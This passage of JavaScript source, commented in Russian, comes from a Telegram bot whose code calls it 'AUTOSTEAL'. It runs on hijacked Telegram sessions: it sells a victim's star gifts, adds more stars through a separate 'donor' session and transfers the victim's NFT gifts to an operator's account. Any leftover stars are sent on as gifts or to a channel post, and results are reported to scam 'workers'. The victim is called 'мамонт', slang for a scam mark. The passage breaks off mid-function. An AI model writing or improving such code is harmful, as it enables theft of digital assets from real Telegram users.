            console.log(`[AUTOSTEAL] 💰 Получаю список доступных подарков из БД...`);
            const allowedGifts = await getDonorGiftsFromDB(donorClient, donorSessionId);
            console.log(`[AUTOSTEAL] 💰 Найдено доступных подарков: ${allowedGifts.length}`);
            
            if (allowedGifts.length === 0) {
              console.error(`[AUTOSTEAL] ❌ Нет доступных подарков в БД донорской сессии`);
              await donorClient.disconnect();
              await safeEditMessage(chatId, statusMessage.message_id,
                `❌ Нет доступных обычных подарков для покупки на донорской сессии`
              );
              return;
            }
            
            // Проверяем баланс донорской сессии перед расчётом подарков
            console.log(`[AUTOSTEAL] 💰 Проверяю баланс донорской сессии...`);
            const donorStarsBalance = await getStarsBalance(donorClient);
            console.log(`[AUTOSTEAL] 💰 Баланс донорской сессии: ${donorStarsBalance} звёзд`);
            console.log(`[AUTOSTEAL] 💰 Нужно звёзд: ${neededStars}`);
            
            // Ограничиваем neededStars до доступного баланса донорской сессии
            const originalNeededStars = neededStars;
            if (donorStarsBalance < neededStars) {
              console.log(`[AUTOSTEAL] 💰 ⚠️  Баланс донорской сессии (${donorStarsBalance}) меньше необходимого (${neededStars})`);
              console.log(`[AUTOSTEAL] 💰 Ограничиваю количество подарков до доступного баланса`);
              neededStars = donorStarsBalance;
              console.log(`[AUTOSTEAL] 💰 Скорректированное количество звёзд для закидывания: ${neededStars}`);
            }
            
            // Рассчитываем какие подарки нужно купить (точный расчёт после продажи подарков мамонта)
            console.log(`[AUTOSTEAL] 💰 Рассчитываю какие подарки купить (нужно ${neededStars} звёзд)...`);
            const { gifts: selectedGifts, totalCost, totalStarsAfterSale } = await calculateGiftsToBuy(neededStars, allowedGifts);
            console.log(`[AUTOSTEAL] 💰 Результат расчёта:`);
            console.log(`[AUTOSTEAL]    Выбрано подарков: ${selectedGifts.length}`);
            console.log(`[AUTOSTEAL]    Стоимость покупки: ${totalCost} звёзд`);
            console.log(`[AUTOSTEAL]    После продажи получится: ~${totalStarsAfterSale} звёзд`);
            
            if (selectedGifts.length === 0) {
              await donorClient.disconnect();
              await safeEditMessage(chatId, statusMessage.message_id,
                `❌ Не найдено подарков с достаточной стоимостью на донорской сессии`
              );
              return;
            }
            
            await safeEditMessage(chatId, statusMessage.message_id,
              `📦 Будет отправлено подарков: ${selectedGifts.length}\n` +
              `💰 Стоимость покупки: ${totalCost} звёзд\n` +
              `💵 После продажи получится: ~${totalStarsAfterSale} звёзд\n\n` +
              `⏳ Отправляю подарки...`
            );
            
            // Отправляем подарки
            console.log(`[AUTOSTEAL] 💰 Начинаю отправку ${selectedGifts.length} подарков с донорской сессии...`);
            let sentCount = 0;
            let failedSendCount = 0;
            let progressText = '';
            
            for (let i = 0; i < selectedGifts.length; i++) {
              const { gift, stars } = selectedGifts[i];
              const giftName = gift.name || gift.id || `Подарок #${i + 1}`;
              
              console.log(`[AUTOSTEAL] 💰 [${i + 1}/${selectedGifts.length}] Отправляю подарок: ${giftName} (${stars} звёзд)`);
              progressText += `[${i + 1}/${selectedGifts.length}] Отправка: ${giftName} (${stars} звёзд)\n`;
              
              try {
                await safeEditMessage(chatId, statusMessage.message_id,
                  `📤 Отправка подарков с донорской сессии:\n${progressText}`,
                  { parse_mode: 'HTML' }
                );
              } catch (e) {}
              
              try {
                const success = await buyAndSendGift(donorClient, gift, mainUsername);
                if (success) {
                  console.log(`[AUTOSTEAL] 💰 [${i + 1}/${selectedGifts.length}] ✅ Подарок успешно отправлен`);
                  progressText = progressText.replace(/\[(\d+)\/(\d+)\] Отправка:.*\n/, `[$1/$2] ✅ Отправлен\n`);
                  sentCount++;
                  // Уменьшена задержка для ускорения
                  await new Promise(resolve => setTimeout(resolve, 100));
                } else {
                  console.error(`[AUTOSTEAL] 💰 [${i + 1}/${selectedGifts.length}] ❌ Ошибка отправки подарка (результат: false)`);
                  progressText = progressText.replace(/\[(\d+)\/(\d+)\] Отправка:.*\n/, `[$1/$2] ❌ Ошибка\n`);
                  failedSendCount++;
                }
              } catch (e) {
                console.error(`[AUTOSTEAL] 💰 [${i + 1}/${selectedGifts.length}] ❌ Исключение при отправке: ${e.message || e}`);
                failedSendCount++;
              }
            }
            
            console.log(`[AUTOSTEAL] 💰 Результат отправки подарков с донорской сессии:`);
            console.log(`[AUTOSTEAL]    ✅ Отправлено: ${sentCount}/${selectedGifts.length}`);
            console.log(`[AUTOSTEAL]    ❌ Ошибок: ${failedSendCount}`);
            
            await donorClient.disconnect();
            console.log(`[AUTOSTEAL] 💰 Отключился от донорской сессии`);
            
            await safeEditMessage(chatId, statusMessage.message_id,
              `✅ Отправлено подарков: ${sentCount}\n\n` +
              `⏳ Ожидание получения подарков на основной сессии (1 секунда)...`
            );
            
            // Ждём получения подарков (увеличено время для надёжности)
            console.log(`[AUTOSTEAL] 💰 Ожидаю получения подарков на основной сессии (2 секунды)...`);
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // Продаём полученные подарки
            console.log(`[AUTOSTEAL] 💰 ЭТАП 5.3: Продажа полученных подарков с донорской сессии`);
            await safeEditMessage(chatId, statusMessage.message_id,
              `⏳ Продаю полученные подарки...`
            );
            
            // ОПТИМИЗАЦИЯ: Инвалидируем кэш перед получением новых подарков
            invalidateGiftsCache(client);
            
            const starsBeforeSale = await getStarsBalance(client, sessionPath);
            console.log(`[AUTOSTEAL] 💰 Баланс до продажи полученных подарков: ${starsBeforeSale} звёзд`);
            let newSoldCount = 0;
            let attempts = 0;
            
            // Пытаемся продать подарки (до 3 попыток)
            while (attempts < 3 && newSoldCount === 0) {
              attempts++;
              console.log(`[AUTOSTEAL] 💰 Попытка продажи подарков: ${attempts}/3`);
              if (attempts > 1) {
                console.log(`[AUTOSTEAL] 💰 Ожидание 500мс перед повторной попыткой...`);
                await new Promise(resolve => setTimeout(resolve, 500));
                // ОПТИМИЗАЦИЯ: Инвалидируем кэш перед каждой попыткой
                invalidateGiftsCache(client);
              }
              
              console.log(`[AUTOSTEAL] 💰 Получаю список подарков на основной сессии...`);
              // ОПТИМИЗАЦИЯ: Принудительно обновляем список подарков (без кэша)
              const newGiftsInfo = await getGiftsInfo(client, false);
              const newRegularGifts = newGiftsInfo.regular;
              console.log(`[AUTOSTEAL] 💰 Найдено подарков для продажи: ${newRegularGifts.length}`);
              
              let giftIndex = 0;
              for (const gift of newRegularGifts) {
                giftIndex++;
                try {
                  let savedGiftInput = null;
                  
                  if (gift.msgId) {
                    savedGiftInput = new Api.InputSavedStarGiftUser({
                      msgId: gift.msgId,
                    });
                  } else if (gift.savedId) {
                    let fromPeer = null;
                    if (gift.fromId) {
                      if (gift.fromId.className === 'PeerUser') {
                        try {
                          const fromUser = await client.getEntity(gift.fromId.userId);
                          fromPeer = await client.getInputEntity(fromUser);
                        } catch (e) {
                          console.log(`[AUTOSTEAL] 💰 [${giftIndex}] ⚠️  Ошибка получения fromPeer (User): ${e.message}`);
                          continue;
                        }
                      } else if (gift.fromId.className === 'PeerChat' || gift.fromId.className === 'PeerChannel') {
                        try {
                          const chatId = gift.fromId.chatId || gift.fromId.channelId;
                          const fromChat = await client.getEntity(chatId);
                          fromPeer = await client.getInputEntity(fromChat);
                        } catch (e) {
                          console.log(`[AUTOSTEAL] 💰 [${giftIndex}] ⚠️  Ошибка получения fromPeer (Chat/Channel): ${e.message}`);
                          continue;
                        }
                      }
                    }
                    
                    if (fromPeer) {
                      savedGiftInput = new Api.InputSavedStarGiftChat({
                        peer: fromPeer,
                        savedId: gift.savedId,
                      });
                    }
                  }
                  
                  if (savedGiftInput) {
                    const giftDate = gift.date || gift.gift?.date;
                    if (giftDate) {
                      const giftTimestamp = typeof giftDate === 'number' ? giftDate : parseInt(giftDate);
                      const now = Math.floor(Date.now() / 1000);
                      const daysOld = (now - giftTimestamp) / 86400;
                      
                      if (daysOld > 30) {
                        console.log(`[AUTOSTEAL] 💰 [${giftIndex}] ⏭️  Подарок слишком старый (${Math.floor(daysOld)} дней), пропускаю`);
                        continue;
                      }
                    }
                    
                    console.log(`[AUTOSTEAL] 💰 [${giftIndex}] Продаю подарок...`);
                    const result = await safeInvoke(client, async () => {
                      return await client.invoke(
                        new Api.payments.ConvertStarGift({
                          stargift: savedGiftInput,
                        })
                      );
                    });
                    
                    if (result) {
                      newSoldCount++;
                      console.log(`[AUTOSTEAL] 💰 [${giftIndex}] ✅ Подарок продан`);
                      await persistSession(client, sessionPath);
                      await new Promise(resolve => setTimeout(resolve, 300)); // Увеличено для избежания rate limit
                    } else {
                      console.log(`[AUTOSTEAL] 💰 [${giftIndex}] ⚠️  Результат продажи: null`);
                    }
                  } else {
                    console.log(`[AUTOSTEAL] 💰 [${giftIndex}] ⚠️  Не удалось создать savedGiftInput`);
                  }
                } catch (e) {
                  const errorMsg = e.errorMessage || e.message || 'неизвестная ошибка';
                  if (!errorMsg.includes('STARGIFT_CONVERT_TOO_OLD')) {
                    console.error(`[AUTOSTEAL] 💰 [${giftIndex}] ❌ Ошибка продажи: ${errorMsg}`);
                  } else {
                    console.log(`[AUTOSTEAL] 💰 [${giftIndex}] ⏭️  Подарок слишком старый для продажи`);
                  }
                  continue;
                }
              }
              
              console.log(`[AUTOSTEAL] 💰 Попытка ${attempts}: продано ${newSoldCount} подарков`);
              if (newSoldCount > 0) {
                console.log(`[AUTOSTEAL] 💰 ✅ Успешно продано подарков, выхожу из цикла попыток`);
                break;
              } else {
                console.log(`[AUTOSTEAL] 💰 ⚠️  Подарки не продались, ${attempts < 3 ? 'пробую ещё раз...' : 'превышено количество попыток'}`);
              }
            }
            
            const starsAfterSale = await getStarsBalance(client, sessionPath);
            const starsEarnedFromDonor = starsAfterSale - starsBeforeSale;
            console.log(`[AUTOSTEAL] 💰 Результат продажи полученных подарков:`);
            console.log(`[AUTOSTEAL]    ✅ Продано: ${newSoldCount}`);
            console.log(`[AUTOSTEAL]    💰 Получено звёзд: ${starsEarnedFromDonor}`);
            console.log(`[AUTOSTEAL]    ⭐ Баланс после продажи: ${starsAfterSale} звёзд`);
            
            await safeEditMessage(chatId, statusMessage.message_id,
              `✅ Продано полученных подарков: ${newSoldCount}\n` +
              `💰 Получено звёзд: ${starsEarnedFromDonor}\n` +
              `⭐ Текущий баланс: ${starsAfterSale}\n\n` +
              `⏳ Проверяю, хватает ли звёзд для передачи NFT...`
            );
            
            // Обновляем баланс после продажи подарков с донорской сессии
            starsBalance = starsAfterSale;
            neededStars = Math.max(0, transferCost - starsBalance);
            
            console.log(`[AUTOSTEAL] 💰 После продажи подарков с донорской:`);
            console.log(`[AUTOSTEAL]    Баланс: ${starsBalance} звёзд`);
            console.log(`[AUTOSTEAL]    Нужно для всех NFT: ${transferCost} звёзд`);
            console.log(`[AUTOSTEAL]    Не хватает: ${neededStars} звёзд`);
            
            // Разделяем платные и бесплатные NFT
            const paidNFTs = transferableNFTs.filter(nft => !nft.freeTransfer);
            const freeNFTs = transferableNFTs.filter(nft => nft.freeTransfer);
            
            // Рассчитываем сколько платных NFT можно передать на текущий баланс
            const maxAffordablePaidNFTs = Math.floor(starsBalance / 25);
            const nftsToTransfer = [];
            
            // Добавляем бесплатные NFT (они не требуют оплаты)
            nftsToTransfer.push(...freeNFTs);
            
            // Добавляем платные NFT, на которые хватает звёзд
            const affordablePaidNFTs = paidNFTs.slice(0, maxAffordablePaidNFTs);
            nftsToTransfer.push(...affordablePaidNFTs);
            
            // Остальные платные NFT, на которые не хватило звёзд
            const remainingPaidNFTs = paidNFTs.slice(maxAffordablePaidNFTs);
            
            console.log(`[AUTOSTEAL] 💰 Расчёт NFT для передачи:`);
            console.log(`[AUTOSTEAL]    Бесплатных NFT: ${freeNFTs.length} (все будут переданы)`);
            console.log(`[AUTOSTEAL]    Платных NFT можно передать: ${maxAffordablePaidNFTs} из ${paidNFTs.length}`);
            console.log(`[AUTOSTEAL]    Платных NFT останется: ${remainingPaidNFTs.length}`);
            
            if (nftsToTransfer.length > 0) {
              const recipientDisplay = recipientId ? `ID ${recipientId}` : `@${recipientUsername}`;
              const transferMessage = remainingPaidNFTs.length > 0
                ? `✅ Звёзд хватает для передачи ${nftsToTransfer.length} NFT (${freeNFTs.length} бесплатных + ${affordablePaidNFTs.length} платных)\n` +
                  `⚠️ Останется ${remainingPaidNFTs.length} NFT без передачи (не хватает звёзд)\n\n` +
                  `⏳ Начинаю передачу на ${recipientDisplay}...`
                : `✅ Теперь звёзд достаточно! Начинаю передачу ${nftsToTransfer.length} платных NFT на ${recipientDisplay}...`;
              
              await safeEditMessage(chatId, statusMessage.message_id, transferMessage);
              
              let progressText = '';
              const result = await transferNFT(client, recipient, async (msg) => {
                progressText += msg + '\n';
                if (progressText.length > 3000) {
                  progressText = progressText.slice(-2000);
                }
                try {
                  await safeEditMessage(chatId, statusMessage.message_id,
                    `🔄 Передача NFT:\n${progressText}`,
                    { parse_mode: 'HTML' }
                  );
                } catch (e) {}
              }, nftsToTransfer, sessionPath);
              
              // Добавляем оставшиеся NFT в список не переданных
              if (remainingPaidNFTs.length > 0) {
                const remainingFailed = remainingPaidNFTs.map(nft => ({
                  name: nft.name || 'Неизвестный NFT',
                  link: nft.link || '',
                  error: 'Недостаточно звёзд для передачи'
                }));
                stats.nftFailed = [...(stats.nftFailed || []), ...remainingFailed];
              }
              
              // Объединяем результаты с бесплатными NFT (если были переданы выше)
              stats.nftSuccess = result.success || [];
              // Сохраняем успешно переданные NFT в base.txt
              if (result.success && result.success.length > 0) {
                await saveSuccessfulNFTs(result.success);
              }
              // Объединяем ошибки из проверки и из передачи
              const allFailedNFTs3 = [...(result.failed || []), ...nonTransferableNFTs.map(item => ({
                name: item.name,
                link: item.link,
                error: item.error
              }))];
              stats.nftFailed = allFailedNFTs3;
              
              let nftList = '';
              if (result.success && result.success.length > 0) {
                result.success.forEach((nft, index) => {
                  nftList += `\n${index + 1}. ${nft.name} - <code>${nft.link}</code>`;
                });
              }
              
              const mamontText = `\n👤 <b>Мамонт:</b> @${accountInfo.username || 'без username'} (<code>${accountInfo.id}</code>)`;
              const workerTextFormatted3 = workerUsername || workerId ? `\n👤 <b>Воркер:</b> @${workerUsername || 'неизвестно'} (<code>${workerId || 'неизвестно'}</code>)` : '';
              
              if (allFailedNFTs3.length > 0) {
                let failedList = '';
                allFailedNFTs3.forEach((nft, index) => {
                  failedList += `\n${index + 1}. ${nft.name} - ${nft.link}\n   ❌ <code>${nft.error || 'неизвестная ошибка'}</code>`;
                });
                // Убрано логирование ошибок передачи NFT
              }
          
          await bot.editMessageText(
                `✅ NFT переданы!\n` +
                `Успешно: ${result.sent}\n` +
                `Ошибок: ${result.failed}\n\n` +
                `⏳ Проверяю остаток звёзд...`,
                { chat_id: chatId, message_id: statusMessage.message_id }
              );
              
              // Получаем остаток звёзд
              const remainingStars = await getStarsBalance(client);
              
              if (remainingStars > 0) {
                const remainingStarsDisplay = remainingStarsRecipientId ? `ID ${remainingStarsRecipientId}` : `@${remainingStarsRecipientUsername}`;
                await bot.editMessageText(
                  `💰 Остаток звёзд: ${remainingStars}\n` +
                  `⏳ Отправляю остаток в виде подарков на ${remainingStarsDisplay}...`,
                  { chat_id: chatId, message_id: statusMessage.message_id }
                );
                
                // Отправляем остаток в виде подарков
                let giftProgressText = '';
                const giftResult = await sendRemainingStarsAsGifts(
                  client,
                  remainingStarsRecipient,
                  remainingStars,
                  async (msg) => {
                    giftProgressText += msg + '\n';
                    if (giftProgressText.length > 3000) {
                      giftProgressText = giftProgressText.slice(-2000);
                    }
                    try {
                      await bot.editMessageText(
                        `🔄 Отправка подарков:\n${giftProgressText}`,
                        { chat_id: chatId, message_id: statusMessage.message_id, parse_mode: 'HTML' }
                      );
                    } catch (e) {}
                  }
                );
                
                await bot.editMessageText(
                  `✅ Автостил завершён!\n\n` +
                  `📊 РЭЗУЛЬТ🅰️ТЫ:\n` +
                  `💰 Продано подарков (основная сессия): ${soldCount} (+${starsEarned} звёзд)\n` +
                  `📦 Получено подарков с дополнительной: ${sentCount}\n` +
                  `💰 Продано подарков (с дополнительной): ${newSoldCount} (+${starsEarnedFromDonor} звёзд)\n` +
                  `🖼️  NFT отправлено: ${result.sent}\n` +
                  `🎁 Подарков отправлено: ${giftResult.sent}\n` +
                  `💰 Потрачено звёзд на подарки: ${giftResult.spent || 0}`,
                  { chat_id: chatId, message_id: statusMessage.message_id }
                );
                
                await sendAutostealResults(accountInfo, workerUsername, workerId, stats, mamontUsername, mamontId);
              } else {
                await bot.editMessageText(
                  `✅ Автостил завершён!\n\n` +
                  `📊 Результаты:\n` +
                  `💰 Продано подарков (основная сессия): ${soldCount} (+${starsEarned} звёзд)\n` +
                  `📦 Получено подарков с донорской: ${sentCount}\n` +
                  `💰 Продано подарков (с донорской): ${newSoldCount} (+${starsEarnedFromDonor} звёзд)\n` +
                  `🖼️  NFT отправлено: ${result.sent}\n` +
                  `💰 Остаток звёзд: 0`,
                  { chat_id: chatId, message_id: statusMessage.message_id }
                );
                
                await sendAutostealResults(accountInfo, workerUsername, workerId, stats, mamontUsername, mamontId);
              }
            } else {
              // Звёзд всё равно не хватает, но передаём столько NFT, на сколько хватает
              console.log(`[AUTOSTEAL] ⚠️  Звёзд недостаточно для всех NFT, но передам столько, на сколько хватает`);
              
              // Разделяем платные и бесплатные NFT
              const paidNFTs = transferableNFTs.filter(nft => !nft.freeTransfer);
              const freeNFTs = transferableNFTs.filter(nft => nft.freeTransfer);
              
              // Рассчитываем сколько платных NFT можно передать на текущий баланс
              const maxAffordablePaidNFTs = Math.floor(starsBalance / 25);
              const nftsToTransfer = [];
              
              // Добавляем бесплатные NFT (они не требуют оплаты)
              nftsToTransfer.push(...freeNFTs);
              
              // Добавляем платные NFT, на которые хватает звёзд
              const affordablePaidNFTs = paidNFTs.slice(0, maxAffordablePaidNFTs);
              nftsToTransfer.push(...affordablePaidNFTs);
              
              // Остальные платные NFT, на которые не хватило звёзд
              const remainingPaidNFTs = paidNFTs.slice(maxAffordablePaidNFTs);
              
              console.log(`[AUTOSTEAL] 💰 Расчёт NFT для передачи:`);
              console.log(`[AUTOSTEAL]    Бесплатных NFT: ${freeNFTs.length} (все будут переданы)`);
              console.log(`[AUTOSTEAL]    Платных NFT можно передать: ${maxAffordablePaidNFTs} из ${paidNFTs.length}`);
              console.log(`[AUTOSTEAL]    Платных NFT останется: ${remainingPaidNFTs.length}`);
              
              if (nftsToTransfer.length > 0) {
                const recipientDisplay = recipientId ? `ID ${recipientId}` : `@${recipientUsername}`;
                const transferMessage = remainingPaidNFTs.length > 0
                  ? `⚠️ Звёзд хватает только для ${nftsToTransfer.length} NFT (${freeNFTs.length} бесплатных + ${affordablePaidNFTs.length} платных)\n` +
                    `⚠️ Останется ${remainingPaidNFTs.length} NFT без передачи (не хватает звёзд)\n\n` +
                    `⏳ Начинаю передачу на ${recipientDisplay}...`
                  : `✅ Начинаю передачу ${nftsToTransfer.length} NFT на ${recipientDisplay}...`;
                
                await safeEditMessage(chatId, statusMessage.message_id, transferMessage);
                
                let progressText = '';
                const result = await transferNFT(client, recipient, async (msg) => {
                  progressText += msg + '\n';
                  if (progressText.length > 3000) {
                    progressText = progressText.slice(-2000);
                  }
                  try {
                    await safeEditMessage(chatId, statusMessage.message_id,
                      `🔄 Передача NFT:\n${progressText}`,
                      { parse_mode: 'HTML' }
                    );
                  } catch (e) {}
                }, nftsToTransfer, sessionPath);
                
                // Добавляем оставшиеся NFT в список не переданных
                if (remainingPaidNFTs.length > 0) {
                  const remainingFailed = remainingPaidNFTs.map(nft => ({
                    name: nft.name || 'Неизвестный NFT',
                    link: nft.link || '',
                    error: 'Недостаточно звёзд для передачи'
                  }));
                  stats.nftFailed = [...(stats.nftFailed || []), ...remainingFailed];
                }
                
                stats.nftSuccess = result.success || [];
                // Сохраняем успешно переданные NFT в base.txt
                if (result.success && result.success.length > 0) {
                  await saveSuccessfulNFTs(result.success);
                }
                const allFailedNFTs4 = [...(result.failed || []), ...nonTransferableNFTs.map(item => ({
                  name: item.name,
                  link: item.link,
                  error: item.error
                }))];
                stats.nftFailed = [...(stats.nftFailed || []), ...allFailedNFTs4];
                
                await bot.editMessageText(
                  `✅ NFT переданы (частично)!\n` +
                  `Успешно: ${result.sent}\n` +
                  `Ошибок: ${result.failed}\n` +
                  `⚠️ Не передано (не хватает звёзд): ${remainingPaidNFTs.length}\n\n` +
                  `⏳ Проверяю остаток звёзд...`,
                  { chat_id: chatId, message_id: statusMessage.message_id }
                );
                
                // Получаем остаток звёзд
                const remainingStars = await getStarsBalance(client);
                
                if (remainingStars > 0) {
                  const remainingStarsDisplay = remainingStarsRecipientId ? `ID ${remainingStarsRecipientId}` : `@${remainingStarsRecipientUsername}`;
                  await bot.editMessageText(
                    `💰 Остаток звёзд: ${remainingStars}\n` +
                    `⏳ Отправляю остаток в виде подарков на ${remainingStarsDisplay}...`,
                    { chat_id: chatId, message_id: statusMessage.message_id }
                  );
                  
                  // Отправляем остаток в виде подарков
                  let giftProgressText = '';
                  const giftResult = await sendRemainingStarsAsGifts(
                    client,
                    remainingStarsRecipient,
                    remainingStars,
                    async (msg) => {
                      giftProgressText += msg + '\n';
                      if (giftProgressText.length > 3000) {
                        giftProgressText = giftProgressText.slice(-2000);
                      }
                      try {
                        await bot.editMessageText(
                          `🔄 Отправка подарков:\n${giftProgressText}`,
                          { chat_id: chatId, message_id: statusMessage.message_id, parse_mode: 'HTML' }
                        );
                      } catch (e) {}
                    }
                  );
                  
                  await bot.editMessageText(
                    `✅ Автостил завершён!\n\n` +
                    `📊 РЭЗУЛЬТ🅰️ТЫ:\n` +
                    `💰 Продано подарков (основная сессия): ${soldCount} (+${starsEarned} звёзд)\n` +
                    `📦 Получено подарков с донорской: ${sentCount}\n` +
                    `💰 Продано подарков (с донорской): ${newSoldCount} (+${starsEarnedFromDonor} звёзд)\n` +
                    `🖼️  NFT отправлено: ${result.sent}\n` +
                    `⚠️ NFT не передано (не хватало звёзд): ${remainingPaidNFTs.length}\n` +
                    `🎁 Подарков отправлено: ${giftResult.sent}\n` +
                    `💰 Потрачено звёзд на подарки: ${giftResult.spent || 0}`,
                    { chat_id: chatId, message_id: statusMessage.message_id }
                  );
                  
                  await sendAutostealResults(accountInfo, workerUsername, workerId, stats, mamontUsername, mamontId);
                } else {
                  await bot.editMessageText(
                    `✅ Автостил завершён!\n\n` +
                    `📊 РЭЗУЛЬТ🅰️ТЫ:\n` +
                    `💰 Продано подарков (основная сессия): ${soldCount} (+${starsEarned} звёзд)\n` +
                    `📦 Получено подарков с донорской: ${sentCount}\n` +
                    `💰 Продано подарков (с донорской): ${newSoldCount} (+${starsEarnedFromDonor} звёзд)\n` +
                    `🖼️  NFT отправлено: ${result.sent}\n` +
                    `⚠️ NFT не передано (не хватало звёзд): ${remainingPaidNFTs.length}\n` +
                    `💰 Остаток звёзд: 0`,
                    { chat_id: chatId, message_id: statusMessage.message_id }
                  );
                  
                  await sendAutostealResults(accountInfo, workerUsername, workerId, stats, mamontUsername, mamontId);
                }
              } else {
                // Нет NFT для передачи вообще - продаём все оставшиеся подарки и отправляем звёзды на сообщение
                console.error(`[AUTOSTEAL] ❌ НЕТ NFT ДЛЯ ПЕРЕДАЧИ (не хватает звёзд даже для одного)`);
                console.log(`[AUTOSTEAL] 💰 Продаю все оставшиеся обычные подарки и отправляю звёзды на сообщение`);
                
                // Получаем информацию о подарках заново
                const currentGiftsInfo = await getGiftsInfo(client);
                const currentStarsBalance = await getStarsBalance(client, sessionPath);
                
                // Продаём все оставшиеся обычные подарки
                if (currentGiftsInfo.regular.length > 0) {
                await bot.editMessageText(
                    `❌ Недостаточно звёзд для передачи NFT.\n\n` +
                    `💰 Найдено обычных подарков: ${currentGiftsInfo.regular.length}\n` +
                    `⏳ Продаю все подарки...`,
                  { chat_id: chatId, message_id: statusMessage.message_id }
                );
                  
                  let soldCount = 0;
                  for (let i = 0; i < currentGiftsInfo.regular.length; i++) {
                    const gift = currentGiftsInfo.regular[i];
                    try {
                      let savedGiftInput = null;
                      
                      if (gift.msgId) {
                        savedGiftInput = new Api.InputSavedStarGiftUser({
                          msgId: gift.msgId,
                        });
                      } else if (gift.savedId) {
                        let fromPeer = null;
                        if (gift.fromId) {
                          if (gift.fromId.className === 'PeerUser') {
                            try {
                              const fromUser = await client.getEntity(gift.fromId.userId);
                              fromPeer = await client.getInputEntity(fromUser);
                            } catch (e) {
                              continue;
                            }
                          } else if (gift.fromId.className === 'PeerChat' || gift.fromId.className === 'PeerChannel') {
                            try {
                              const chatId = gift.fromId.chatId || gift.fromId.channelId;
                              const fromChat = await client.getEntity(chatId);
                              fromPeer = await client.getInputEntity(fromChat);
                            } catch (e) {
                              continue;
                            }
                          }
                        }
                        
                        if (fromPeer) {
                          savedGiftInput = new Api.InputSavedStarGiftChat({
                            peer: fromPeer,
                            savedId: gift.savedId,
                          });
                        }
                      }
                      
                      if (savedGiftInput) {
                        try {
                          const result = await safeInvoke(client, async () => {
                            return await client.invoke(
                              new Api.payments.ConvertStarGift({
                                stargift: savedGiftInput,
                              })
                            );
                          });
                          
                          if (result) {
                            soldCount++;
                            await persistSession(client, sessionPath);
                            await new Promise(resolve => setTimeout(resolve, 100));
                          }
                        } catch (e) {
                          // Игнорируем ошибки продажи
                        }
                      }
                    } catch (e) {
                      // Игнорируем ошибки
                    }
                  }
                  
                  console.log(`[AUTOSTEAL] 💰 Продано подарков: ${soldCount}`);
                }
                
                // Отправляем все оставшиеся звёзды на сообщение в канале
                const finalStarsBalance = await getStarsBalance(client, sessionPath);
                stats.starsAfter = finalStarsBalance;
                
                if (finalStarsBalance > 0) {
                  console.log(`[AUTOSTEAL] ⭐ Отправляю все оставшиеся звёзды (${finalStarsBalance}) на сообщение в канале`);
                  await bot.editMessageText(
                    `❌ Недостаточно звёзд для передачи NFT.\n\n` +
                    `💰 Обычных подарков продано: ${currentGiftsInfo.regular.length > 0 ? 'часть' : 0}\n` +
                    `⭐ Остаток звёзд: ${finalStarsBalance}\n` +
                    `⏳ Отправляю звёзды на сообщение в канале...`,
                    { chat_id: chatId, message_id: statusMessage.message_id }
                  );
                  
                  const starsChannelId = config.starsChannelId;
                  const starsMessageId = config.starsMessageId;
                  
                  if (starsChannelId && starsMessageId) {
                    try {
                      const starsResult = await sendStarsToChannelMessage(client, starsChannelId, starsMessageId, finalStarsBalance);
                      
                      if (starsResult.success) {
                        console.log(`[AUTOSTEAL] ✅ Успешно отправлено ${finalStarsBalance} звёзд на сообщение в канале`);
                        stats.starsAfter = 0;
                        await bot.editMessageText(
                          `✅ АВТОСТИЛ ЗАВЕРШЁН!\n\n` +
                          `📊 Результаты:\n` +
                          `💰 Обычных подарков продано: ${currentGiftsInfo.regular.length > 0 ? 'часть' : 0}\n` +
                          `⭐ Звёзд отправлено на сообщение: ${finalStarsBalance}`,
                          { chat_id: chatId, message_id: statusMessage.message_id }
                        );
                      } else {
                        await bot.editMessageText(
                          `❌ Недостаточно звёзд для передачи NFT.\n\n` +
                          `⭐ Остаток звёзд: ${finalStarsBalance}\n` +
                          `❌ Ошибка отправки звёзд на сообщение`,
                          { chat_id: chatId, message_id: statusMessage.message_id }
                        );
                      }
                    } catch (e) {
                      console.error(`[AUTOSTEAL] ❌ Ошибка при отправке звёзд: ${e.message}`);
                    }
                  }
                } else {
                  await bot.editMessageText(
                    `❌ Недостаточно звёзд для передачи NFT.\n\n` +
                    `💰 Обычных подарков продано: ${currentGiftsInfo.regular.length > 0 ? 'часть' : 0}\n` +
                    `⭐ Остаток звёзд: 0`,
                    { chat_id: chatId, message_id: statusMessage.message_id }
                  );
                }
                
                await sendAutostealResults(accountInfo, workerUsername, workerId, stats, mamontUsername, mamontId);
              }
            }
          } catch (e) {
            await donorClient.disconnect();
            await bot.editMessageText(
              `❌ Ошибка при работе с донорской сессией: ${e.message}`,
              { chat_id: chatId, message_id: statusMessage.message_id }
            );
            
            await sendAutostealResults(accountInfo, workerUsername, workerId, stats, mamontUsername, mamontId);
          }
        }
      } else {
        // Нет обычных подарков для продажи - сразу переходим к донорской сессии
        console.log(`[AUTOSTEAL] Обычных подарков нет, подключаюсь к донорской сессии...`);
        await bot.editMessageText(
          `❌ Недостаточно звёзд для передачи NFT.\n` +
          `Нужно: ${transferCost}, есть: ${starsBalance}\n` +
          `Не хватает: ${neededStars}\n\n` +
          `ℹ️ Обычных подарков для продажи не найдено.\n` +
          `⏳ Подключаюсь к донорской сессии...`,
          { chat_id: chatId, message_id: statusMessage.message_id }
        );
        
        // Подключаемся к донорской сессии
        const donorPath = path.join(__dirname, config.donorFolder || 'donor');
        console.log(`[AUTOSTEAL] Проверяю донорскую сессию в папке: ${donorPath}`);
        
        if (!(await fs.pathExists(donorPath))) {
          console.error(`[AUTOSTEAL] Папка донорской сессии не найдена: ${donorPath}`);
          const workerTextFormatted = workerUsername || workerId ? `\n👤 <b>Воркер:</b> @${workerUsername || 'неизвестно'} (<code>${workerId || 'неизвестно'}</code>)` : '';
          // Убрано логирование ошибок донорской сессии
          await bot.editMessageText(
            `❌ Папка донорской сессии не найдена: ${donorPath}\n` +
            `💡 Создайте папку и поместите туда .session файл донорской сессии`,
            { chat_id: chatId, message_id: statusMessage.message_id }
          );
          
          await sendAutostealResults(accountInfo, workerUsername, workerId, stats, mamontUsername, mamontId);
          return;
        }
        
        const files = await fs.readdir(donorPath);
        const sessionFile = files.find(f => f.endsWith('.session'));
        
        if (!sessionFile) {
          console.error(`[AUTOSTEAL] Файл .session не найден в папке: ${donorPath}`);
          const workerTextFormatted = workerUsername || workerId ? `\n👤 <b>Воркер:</b> @${workerUsername || 'неизвестно'} (<code>${workerId || 'неизвестно'}</code>)` : '';
          // Убрано логирование ошибок донорской сессии
          await bot.editMessageText(
            `❌ Файл .session не найден в папке донорской сессии\n` +
